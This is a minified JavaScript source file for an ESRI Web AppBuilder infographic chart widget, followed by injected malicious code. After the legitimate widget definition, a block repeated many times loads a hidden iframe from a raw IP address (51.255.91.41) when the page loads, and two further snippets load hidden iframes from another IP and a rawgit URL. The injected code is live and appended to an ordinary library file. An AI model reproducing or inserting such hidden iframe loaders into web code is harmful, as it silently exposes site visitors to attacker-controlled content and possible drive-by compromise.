// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/lang dojo/_base/html dojo/_base/array dojo/_base/declare ./BaseDijit moment/moment jimu/dijit/_chartDijitOption jimu/dijit/Chart jimu/DataSourceManager jimu/LayerInfos/LayerInfos".split(" "),function(f,k,g,l,m,h,n,p,q,r){window.makeTwix(h);return l([m],{templateString:'\x3cdiv\x3e\x3cdiv data-dojo-attach-point\x3d"noDataDiv" class\x3d"no-data-tip"\x3e${nls.noData}\x3c/div\x3e\x3cdiv class\x3d"chart-dom" data-dojo-attach-point\x3d"chartDomNode"\x3e\x3c/div\x3e\x3c /div\x3e',type:"chart",
baseClass:"infographic-chart-dijit",layerInfosObj:null,dataSourceManager:null,featuresCountForPreview:50,highLightColor:"#00ffff",dataSource:null,config:null,map:null,maxTimeIntervals:1E4,maxLabels:1E4,dataSourceType:"",featureLayer:null,constructor:function(a){this.config=a.config;this.layerInfosObj=r.getInstanceSync();this.dataSourceManager=q.getInstance()},postCreate:function(){this.inherited(arguments);this.DEFAULT_CONFIG={type:this.config.type||"column",theme:this._getChartTheme(),labels:[],
series:[{data:[]}]};this.domNode.style.width="100%";this.domNode.style.height="100%";this.chartDomNode.style.width="100%";this.chartDomNode.style.height="100%";var a={map:null};this.inSettingPage||(a.map=this.map);this.chartDijitOption=new n(a);this._initChart();this._updateBackgroundColor()},_getChartTheme:function(){return this.isDarkTheme()?"dark":"light"},clearChart:function(){this._showNodata()},startup:function(){this.inherited(arguments);setTimeout(f.hitch(this,function(){this.chart.resize();
this.inSettingPage?this._tryUpdateStatisticsChart():this.dataSource&&this.setDataSource(this.dataSource)}),200)},destroy:function(){this.chart&&this.chart.destroy();this.chart=null;this.inherited(arguments)},resize:function(){this.chart&&this.chart.resize()},setDataSource:function(a){this.dataSourceType="";this.featureLayer=null;this.inherited(arguments);if(a)if(a.layerId)this._setDataSourceForLayerId(a);else if(a.frameWorkDsId){var b=this._getDsTypeInfoAndDsMeta(a.frameWorkDsId),c=b.dsTypeInfo,b=
b.dsMeta;c&&b&&("Features"===b.type?this._setDataSourceForFrameworkFeatures(a,c,b):"FeatureStatistics"===b.type&&this._setDataSourceForFeatureStatistics(a,c,b))}},_getDsTypeInfoAndDsMeta:function(a){var b={dsTypeInfo:null,dsMeta:null};b.dsTypeInfo=this.dataSourceManager.parseDataSourceId(a);var c=this.appConfig.dataSource&&this.appConfig.dataSource.dataSources;c&&(b.dsMeta=c[a]);return b},_updateBackgroundColor:function(){this.config&&this.config.backgroundColor&&this.setBackgroundColor(this.config.backgroundColor)},
setBackgroundColor:function(a){this.domNode.style.backgroundColor=a},setConfig:function(a){this.config=a;this._updateBackgroundColor();this._tryUpdateStatisticsChart()},onDataSourceDataUpdate:function(a){this.inherited(arguments);"CLIENT_FEATURES"===this.dataSourceType?this._onDataUpdateForClientFeatures(a):"FRAMEWORK_STATISTICS"===this.dataSourceType?this._onDataUpdateForFrameworkStatistics(a):"FRAMEWORK_FEATURES"===this.dataSourceType&&this._onDataUpdateForFrameworkFeatures(a)},_renderChartForServer:function(a){this.chartDijitOption.mockFeatureLayerAndChartConfigValueFieldsForServer(a).then(function(a){a=
this.chartDijitOption.getChartOptionForServer(a,this.chart);this._checkIsTooManyLabels(a)||this.chart.updateConfig(a)}.bind(this))},_renderChart:function(a){this.chartDijitOption.getLoadedLayer(a.featureLayerOrUrlOrLayerDefinition).then(function(b){b=this.chartDijitOption.getChartOption({featureLayer:b,features:a.features,chartConfig:a.config,popupFieldInfosObj:a.popupFieldInfosObj,featureLayerForChartSymbologyChart:a.featureLayerForChartSymbologyChart},this.chart);this._checkIsTooManyLabels(b)||
this.chart.updateConfig(b)}.bind(this))},_initChart:function(){this.chart=new p({chartDom:this.chartDomNode,config:this.DEFAULT_CONFIG});this.chart.placeAt(this.chartDomNode);setTimeout(f.hitch(this,function(){this.chart.resize()}),300)},_tryUpdateStatisticsChart:function(){this._hideNodata();var a=this._getChartConfigFromConfig();a?this.domNode.parentNode?this.data?(this.data.features||(this.data.features=[]),"CLIENT_FEATURES"===this.dataSourceType?this._tryUpdateStatisticsChartForClientFeatures(a):
"FRAMEWORK_FEATURES"===this.dataSourceType?this._tryUpdateStatisticsChartForFrameworkFeatures(a):"FRAMEWORK_STATISTICS"===this.dataSourceType&&this._tryUpdateStatisticsChartForFrameworkStatistics(a)):this._showNodata():this._showNodata():this._showNodata()},_getNodataTextColor:function(){var a="";this.config&&(a="pie"===this.config.type?this.config.dataLabelColor:this.config.horizontalAxisTextColor||this.config.verticalAxisTextColor);a||(a="#666");return a},_getChartConfigFromConfig:function(){var a=
null,b=null;if(this.config&&this.config.mode&&this.config.type){b=f.clone(this.config);b.highLightColor=this.highLightColor;var c=b.type,d=b.mode,a={mode:b.mode,type:b.type},e=[];"feature"===d?e=e.concat(["labelField","valueFields","sortOrder","maxLabels"]):"category"===d?e=e.concat("categoryField dateConfig valueFields sortOrder operation maxLabels nullValue splitField".split(" ")):"count"===d?e=e.concat(["categoryField","dateConfig","sortOrder","maxLabels","splitField"]):"field"===d&&(e=e.concat(["valueFields",
"operation","sortOrder","maxLabels","nullValue"]));d="backgroundColor seriesStyle showLegend legendTextColor legendTextSize stack area highLightColor".split(" ");d="pie"===c?d.concat(["showDataLabel","dataLabelColor","dataLabelSize","innerRadius"]):d.concat("showHorizontalAxis horizontalAxisTextColor horizontalAxisTextSize showVerticalAxis verticalAxisTextColor verticalAxisTextSize".split(" "));g.forEach(e,f.hitch(this,function(c){a[c]=b[c]}));g.forEach(d,f.hitch(this,function(c){a[c]=b[c]}))}this._specialSortOrder(a);
return a},_specialSortOrder:function(a){if(a){var b=a.sortOrder;"feature"===a.mode&&b&&b.field===a.labelField&&(b.isLabelAxis=!0)}},_hasFeatures:function(){return this.data&&this.data.features&&0<=this.data.features.length},showNoData:function(){this._showNodata()},_showNodata:function(a){k.addClass(this.domNode,"no-data");"timeInterval"===a?this.noDataDiv.innerHTML=this.nls.parsingperiodTip:"maxLabels"===a&&(this.noDataDiv.innerHTML=this.nls.manyCategoryTip);this.chart.clear()},_hideNodata:function(){k.removeClass(this.domNode,
"no-data")},_showMockData:function(a){a=f.clone(a);var b=[];a.labelField&&b.push(a.labelField);a.categoryField&&b.push(a.categoryField);a.valueFields&&(b=b.concat(a.valueFields));var c={fields:[]},d={attributes:{}};c.fields=g.map(b,f.hitch(this,function(a){d.attributes[a]=0;return{name:a,type:"esriFieldTypeInteger",alias:a}}));this.chart.resize();if(this._checkIsTooManyTimeInterval([d],a))return this._showNodata("timeInterval");this._renderChart({featureLayerOrUrlOrLayerDefinition:c,features:[d],
config:a,popupFieldInfosObj:this.popupFieldInfosObj})},_setDataSourceForLayerId:function(a){this.dataSourceType="CLIENT_FEATURES";var b=this.layerInfosObj.getLayerInfoById(a.layerId);b&&b.getLayerObject().then(f.hitch(this,function(a){this.popupFieldInfosObj=b.getPopupInfo();this.featureLayer=a;this._tryUpdateStatisticsChart()}))},_onDataUpdateForClientFeatures:function(){this._tryUpdateStatisticsChart()},_tryUpdateStatisticsChartForClientFeatures:function(a){if(this.featureLayer){var b=this.data.features;
b&&this.inSettingPage&&(b=b.slice(0,this.featuresCountForPreview));this.chart.resize();if(this._checkIsTooManyTimeInterval(b,a))return this._showNodata("timeInterval");var c=this._getFeatureLayerForSymbolRenderChart();this._renderChart({featureLayerOrUrlOrLayerDefinition:this.featureLayer,features:b,config:a,popupFieldInfosObj:this.popupFieldInfosObj,featureLayerForChartSymbologyChart:c})}else this._showNodata()},_setDataSourceForFrameworkFeatures:function(){this.dataSourceType="FRAMEWORK_FEATURES";
this._tryUpdateStatisticsChart()},_onDataUpdateForFrameworkFeatures:function(){this._tryUpdateStatisticsChart()},_getFeatureLayerForSymbolRenderChart:function(a){var b=null;this.map&&"undefined"!==typeof a?b=this.map.getLayer(a):this.featureLayer&&(b=this.featureLayer);return b},_tryUpdateStatisticsChartForFrameworkFeatures:function(a){var b=this._getDsTypeInfoAndDsMeta(this.dataSource.frameWorkDsId).dsMeta;if(b){var c=this.data.features;c&&this.inSettingPage&&(c=c.slice(0,this.featuresCountForPreview));
this.chart.resize();if(this._checkIsTooManyTimeInterval(c,a))return this._showNodata("timeInterval");var d=null;if(a.seriesStyle&&"undefined"!==a.seriesStyle.useLayerSymbology){var e=this.dataSourceManager.parseDataSourceId(b.id);"undefined"!==typeof e.layerId&&(d=this._getFeatureLayerForSymbolRenderChart(e.layerId))}this._renderChart({featureLayerOrUrlOrLayerDefinition:b.dataSchema,features:c,config:a,popupFieldInfosObj:this.popupFieldInfosObj,featureLayerForChartSymbologyChart:d})}else this._showNodata()},
_setDataSourceForFeatureStatistics:function(){this.dataSourceType="FRAMEWORK_STATISTICS";this._tryUpdateStatisticsChart()},_onDataUpdateForFrameworkStatistics:function(){this._tryUpdateStatisticsChart()},_tryUpdateStatisticsChartForFrameworkStatistics:function(a){var b=this._getDsTypeInfoAndDsMeta(this.dataSource.frameWorkDsId).dsMeta;if(b){this.chart.resize();if(this._checkIsTooManyTimeInterval(this.data.features,a))return this._showNodata("timeInterval");this._renderChartForServer({dataSchema:b.dataSchema,
statisticsFeatures:this.data.features,config:a})}else this._showNodata()},_checkIsTooManyLabels:function(a){return(a=a.labels)&&a.length>this.maxLabels?(this._showNodata("maxLabels"),!0):!1},_checkIsTooManyTimeInterval:function(a,b){var c=b.dateConfig;if(!c||"automatic"===c.minPeriod)return!1;var d=b.categoryField;b=a.map(f.hitch(this,function(a){return a.attributes[d]}));b=b.filter(function(a){return!!a});a=Math.min.apply(Math,b);b=Math.max.apply(Math,b);a=h(a).subtract(1,"seconds").local();b=h(b).add(1,
"seconds").local();return Math.round(b.diff(a,c.minPeriod,!0))>=this.maxTimeIntervals}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});